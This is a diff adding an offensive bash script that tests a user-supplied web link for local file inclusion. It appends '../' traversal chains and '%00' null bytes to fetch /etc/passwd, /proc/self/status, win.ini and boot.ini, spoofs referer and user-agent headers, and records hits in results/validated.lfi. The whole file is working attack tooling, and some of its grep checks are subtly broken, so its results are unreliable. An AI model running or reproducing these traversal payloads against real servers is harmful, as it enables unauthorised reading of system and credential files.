@@ -1,0 +1,267 @@
+#!/bin/bash
+# LFI Link Vulnerability Validator Script
+# Uses regex technique to try and find readable file to confirm existance of exploitable LFI
+# check page responses, if 200 then perform regex check to see if LFI indicators present, if not continue chekcing at deeper depths until max depth hit.
+
+LFISTORAGE1=$(mktemp -p "$JUNK" -t fooooobarLFI1.tmp.XXX)
+LFISTORAGE2=$(mktemp -p "$JUNK" -t fooooobarLFI2.tmp.XXX)
+LFISTORAGE3=$(mktemp -p "$JUNK" -t fooooobarLFI3.tmp.XXX)
+LCHK1=$(mktemp -p "$JUNK" -t fooooolchk1.tmp.XXX)
+LCHK2=$(mktemp -p "$JUNK" -t fooooolchk2.tmp.XXX)
+LFIFILE1="\/etc\/passwd"
+LFIFILE2="\/proc\/self\/status"
+LFIFILE3="c:\WINDOWS\win.ini"
+LFIFILE4="c:\boot.ini"
+POISON="%00"
+lcount=0
+
+jumper(){
+  # usage: jumper string num
+  for i in $(seq 1 $2); do printf "%s" "$1"; done
+}
+
+pageresponse_check(){
+	curl "$NIX1" -I -o "$LFISTORAGE1" 2> /dev/null
+	cat "$LFISTORAGE1" | sed '2,20d' | cut -d' ' -f2 > "$LFISTORAGE2" 2> /dev/null
+	cat "$LFISTORAGE2" | while read pageresponse
+	do
+		if [ "$pageresponse" == '200' ]; then
+			echo "[ 200 SUCCESS ] $NIX1" | grep --color '\[ 200 SUCCESS \]'
+			echo "1" > "$LFISTORAGE1"
+		elif [ "$pageresponse" == '302' ]; then
+			echo "[ 302 Redirect ] $NIX1" | grep --color '\[ 302 Redirect \]'
+			echo "0" > "$LFISTORAGE1"
+		elif [ "$pageresponse" == '403' ]; then
+			echo "[ 403 Forbidden ] $NIX1" | grep --color '\[ 403 Forbidden \]'
+			echo "0" > "$LFISTORAGE1"
+		elif [ "$pageresponse" == '501' ]; then
+			echo "[ 501 BAD METHOD ] $NIX1" | grep --color '\[ 501 BAD METHOD \]'
+			echo "0" > "$LFISTORAGE1"
+		else
+			echo "[NO RESPONSE] $NIX1"
+		fi
+	done
+	xoxo=$(cat "$LFISTORAGE1")
+	if [ "$xoxo" = 1 ]; then
+		etc_passwd_chk
+	fi
+}
+
+etc_passwd_chk(){
+	curl "$NIX1" --ssl --retry 1 --retry-delay 3 --connect-timeout 2 --no-keepalive -s -e "http://www.google.com/q?=funkychicken" -A "$uagent1" -o "$LCHK1"
+	grep --color -i -E 'root||nobody||webuser||www-data' "$LCHK1" 2> /dev/null 2>&1
+	if [ "$?" != 0 ]; then
+		proc_status_chk
+	else
+		if [ "$MARK" = 1 ]; then
+			echo
+			echo
+			echo "No directory traversal needed, straight LFI with NULL Byte!" | grep --color -E 'No directory traversal needed||straight LFI with NULL Byte'
+			echo "$NIX1"
+		else
+			echo
+			echo
+			echo "No directory traversal needed, straight LFI!" | grep --color -E 'No directory traversal needed||straight LFI'
+			echo "$NIX1"
+		fi
+	fi
+	echo "$NIX1" >> "$LFISTORAGE1" 2> /dev/null
+	echo "$LFISTORAGE1" >> "$LFISTORAGE2" 2> /dev/null
+	cat "$LFISTORAGE2" | sort | uniq > results/validated.lfi 2> /dev/null
+	lfi_banner;
+	lfi_core;
+}
+
+proc_status_chk(){
+	curl "$NIX2" --ssl --retry 1 --retry-delay 3 --connect-timeout 2 --no-keepalive -s -e "http://www.google.com/q?=funkychicken" -A "$uagent2" -o "$LCHK2"
+	grep --color -E 'PPid:||FDSize:' "$LCHK1" 2> /dev/null 2>&1
+	if [ "$?" != 0 ]; then
+		windows_chk1
+	else
+		if [ "$MARK" = 1 ]; then
+			echo
+			echo
+			echo "/etc/passwd not found but we were able to find /proc/self/status with LFI using NULL Byte instead!" | grep --color -E 'etc||passwd not found but we were able to find||proc||self||status with LFI using NULL Byte instead'
+			echo "$NIX2"
+		else
+			echo
+			echo
+			echo "/etc/passwd not found but we were able to find /proc/self/status with clean LFI instead!" | grep --color -E 'etc||passwd not found but we were able to find||proc||self||status with clean LFI instead'
+			echo "$NIX2"
+		fi
+	fi
+	echo "$NIX2" >> "$LFISTORAGE1" 2> /dev/null
+	echo "$LFISTORAGE1" >> "$LFISTORAGE2" 2> /dev/null
+	cat "$LFISTORAGE2" | sort | uniq > results/validated.lfi 2> /dev/null
+	lfi_banner;
+	lfi_core;
+}
+
+windows_chk1(){
+	echo
+	echo "Not finding readable nix files, checking for Windows LFI possibilities now...." | grep --color -i -E 'Not finding readable nix files||checking for Windows LFI possibilities now'
+	echo
+	curl "$WIN1" --ssl --retry 1 --retry-delay 3 --connect-timeout 2 --no-keepalive -s -e "http://www.google.com/q?=funkychicken" -A "$uagent3" -o "$LCHK2"
+	grep --color -E '16-bit app support||mci extensions' "$LCHK2" 2> /dev/null 2>&1
+	if [ "$?" != 0 ]; then
+		windows_chk2
+	else
+		if [ "$MARK" = 1 ]; then
+			echo
+			echo
+			echo "We found the c:\WINDOWS\win.ini file using NULL Byte, appears to be a Windows LFI!..." | grep --color -E 'We found the c||WINDOWS||win||ini file using NULL Byte||appears to be a Windows LFI'
+			echo "$WIN1"
+		else
+			echo
+			echo
+			echo "We found the c:\WINDOWS\win.ini file, appears to be a Windows LFI!..." | grep --color -E 'We found the c||WINDOWS||win||ini file||appears to be a Windows LFI'
+			echo "$WIN1"
+		fi
+	fi
+	echo "$WIN1" >> "$LFISTORAGE1" 2> /dev/null
+	echo "$LFISTORAGE1" >> "$LFISTORAGE2" 2> /dev/null
+	cat "$LFISTORAGE2" | sort | uniq > results/validated.lfi 2> /dev/null
+	lfi_banner;
+	lfi_core;
+}
+
+windows_chk2(){
+	echo
+	echo "Not finding readable nix files, checking for Windows LFI possibilities now...." | grep --color -i -E 'Not finding readable nix files||checking for Windows LFI possibilities now'
+	echo
+	curl "$WIN2" --ssl --retry 1 --retry-delay 3 --connect-timeout 2 --no-keepalive -s -e "http://www.google.com/q?=funkychicken" -A "$uagent4" -o "$LCHK2"
+	grep --color -i -E '16-bit app support||mci extensions' "$LCHK2" 2> /dev/null 2>&1
+	if [ "$?" != 0 ]; then
+		if [ "$lcount" -gt 7 ]; then
+			echo
+			echo "Nothing found, sorry..." | grep --color -E 'Nothing found, sorry'
+			echo
+			lfi_banner;
+			lfi_core;
+		fi
+		lcount=$((lcount +1))
+		lfi_tester2
+	else
+		if [ "$MARK" = 1 ]; then
+			echo
+			echo
+			echo "We found the c:\WINDOWS\win.ini file using NULL Byte, appears to be a Windows LFI!..." | grep --color -E 'We found the c||WINDOWS||win||ini file using NULL Byte||appears to be a Windows LFI'
+			echo "$WIN2"
+		else
+			echo
+			echo
+			echo "We found the c:\WINDOWS\win.ini file, appears to be a Windows LFI!..." | grep --color -E 'We found the c||WINDOWS||win||ini file||appears to be a Windows LFI'
+			echo "$WIN2"
+		fi
+	fi
+	echo "$WIN2" >> "$LFISTORAGE1" 2> /dev/null
+	echo "$LFISTORAGE1" >> "$LFISTORAGE2" 2> /dev/null
+	cat "$LFISTORAGE2" | sort | uniq > results/validated.lfi 2> /dev/null
+	lfi_banner;
+	lfi_core;
+}
+
+lfi_tester(){
+	if [ -z "$pageresponse_set" ]; then
+		pageresponse_check
+	fi     
+	proc_status_chk
+	windows_chk1
+	windows_chk2
+}
+
+lfi_tester2(){
+	if [ "$lcount" = 1 ]; then
+		JUMPD=$(jumper ../ 4)
+		LFITARGET="$LFILINK$JUMPD"
+		NIX1=$(echo "$LFITARGET" | sed "s/$/$LFIFILE1/");
+		NIX2=$(echo "$LFITARGET" | sed "s/$/$LFIFILE2/");
+		WIN1=$(echo "$LFITARGET" | sed "s/$/$LFIFILE3/");
+		WIN2=$(echo "$LFITARGET" | sed "s/$/$LFIFILE4/");
+		MARK=0
+		lfi_tester
+	fi
+	if [ "$lcount" = 2 ]; then
+		JUMPD=$(jumper ../ 7)
+		LFITARGET="$LFILINK$JUMPD"
+		NIX1=$(echo "$LFITARGET" | sed "s/$/$LFIFILE1/");
+		NIX2=$(echo "$LFITARGET" | sed "s/$/$LFIFILE2/");
+		WIN1=$(echo "$LFITARGET" | sed "s/$/$LFIFILE3/");
+		WIN2=$(echo "$LFITARGET" | sed "s/$/$LFIFILE4/");
+		MARK=0
+		lfi_tester
+	fi
+	if [ "$lcount" = 3 ]; then
+		JUMPD=$(jumper ../ 9)
+		LFITARGET="$LFILINK$JUMPD"
+		NIX1=$(echo "$LFITARGET" | sed "s/$/$LFIFILE1/");
+		NIX2=$(echo "$LFITARGET" | sed "s/$/$LFIFILE2/");
+		WIN1=$(echo "$LFITARGET" | sed "s/$/$LFIFILE3/");
+		WIN2=$(echo "$LFITARGET" | sed "s/$/$LFIFILE4/");
+		MARK=0
+		lfi_tester
+	fi
+	if [ "$lcount" = 4 ]; then
+		JUMPD="%00"
+		LFITARGET="$LFILINK"
+		NIX1=$(echo "$LFITARGET" | sed "s/$/$LFIFILE1$JUMPD/");
+		NIX2=$(echo "$LFITARGET" | sed "s/$/$LFIFILE2$JUMPD/");
+		WIN1=$(echo "$LFITARGET" | sed "s/$/$LFIFILE3$JUMPD/");
+		WIN2=$(echo "$LFITARGET" | sed "s/$/$LFIFILE4$JUMPD/");
+		MARK=1
+		lfi_tester
+	fi
+	if [ "$lcount" = 5 ]; then
+		JUMPx=$(jumper ../ 4)
+		JUMPD="%00"
+		LFITARGET="$LFILINK$JUMPx"
+		NIX1=$(echo "$LFITARGET" | sed "s/$/$LFIFILE1$JUMPD/");
+		NIX2=$(echo "$LFITARGET" | sed "s/$/$LFIFILE2$JUMPD/");
+		WIN1=$(echo "$LFITARGET" | sed "s/$/$LFIFILE3$JUMPD/");
+		WIN2=$(echo "$LFITARGET" | sed "s/$/$LFIFILE4$JUMPD/");
+		MARK=1
+		lfi_tester
+	fi
+	if [ "$lcount" = 6 ]; then
+		JUMPx=$(jumper ../ 7)
+		JUMPD="%00"
+		LFITARGET="$LFILINK$JUMPx"
+		NIX1=$(echo "$LFITARGET" | sed "s/$/$LFIFILE1$JUMPD/");
+		NIX2=$(echo "$LFITARGET" | sed "s/$/$LFIFILE2$JUMPD/");
+		WIN1=$(echo "$LFITARGET" | sed "s/$/$LFIFILE3$JUMPD/");
+		WIN2=$(echo "$LFITARGET" | sed "s/$/$LFIFILE4$JUMPD/");
+		MARK=1
+		lfi_tester
+	fi
+	if [ "$lcount" = 7 ]; then
+		JUMPx=$(jumper ../ 9)
+		JUMPD="%00"
+		LFITARGET="$LFILINK$JUMPx"
+		NIX1=$(echo "$LFITARGET" | sed "s/$/$LFIFILE1$JUMPD/");
+		NIX2=$(echo "$LFITARGET" | sed "s/$/$LFIFILE2$JUMPD/");
+		WIN1=$(echo "$LFITARGET" | sed "s/$/$LFIFILE3$JUMPD/");
+		WIN2=$(echo "$LFITARGET" | sed "s/$/$LFIFILE4$JUMPD/");
+		MARK=1
+		lfi_tester
+	fi
+
+}
+
+
+
+#MAIN
+echo
+echo "Please provide the vuln link to see if we can validate LFI vuln: " | grep --color 'Please provide the vuln link to see if we can validate LFI vuln'
+read LFILINK
+echo
+echo "Trying to validate LFI..." | grep --color 'Trying to validate LFI'
+echo
+LFITARGET="$LFILINK"
+NIX1=$(echo "$LFITARGET" | sed "s/$/$LFIFILE1/");
+NIX2=$(echo "$LFITARGET" | sed "s/$/$LFIFILE2/");
+WIN1=$(echo "$LFITARGET" | sed "s/$/$LFIFILE3/");
+WIN2=$(echo "$LFITARGET" | sed "s/$/$LFIFILE4/");
+lfi_tester
+
+
+#EOF
